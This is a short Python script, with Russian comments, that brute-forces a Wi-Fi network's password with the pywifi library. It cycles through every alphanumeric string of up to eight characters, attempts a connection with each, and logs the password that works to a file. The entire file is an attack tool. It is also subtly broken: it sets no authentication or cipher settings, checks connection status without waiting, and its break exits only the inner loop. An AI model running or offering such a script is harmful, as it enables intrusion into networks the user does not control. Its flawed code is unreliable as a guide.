import itertools
import pywifi
from pywifi import const

# Список символов, которые будут использоваться для генерации паролей
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

# Название Wi-Fi сети, к которой осуществляется подбор паролей
wifi_name = "название_вашей_сети"

output_file = "passwords.txt"

def generate_and_test_passwords():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    profile = pywifi.Profile()
    profile.ssid = wifi_name
    for length in range(1, 9):  # Генерация паролей длиной от 1 до 8 символов
        for candidate in itertools.product(charset, repeat=length):
            password = "".join(candidate)
            profile.key = password
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            if iface.status() == const.IFACE_CONNECTED:
                with open(output_file, "a") as file:
                    file.write(f"Wi-Fi: {wifi_name}, Password: {password}\n")
                break

generate_and_test_passwords()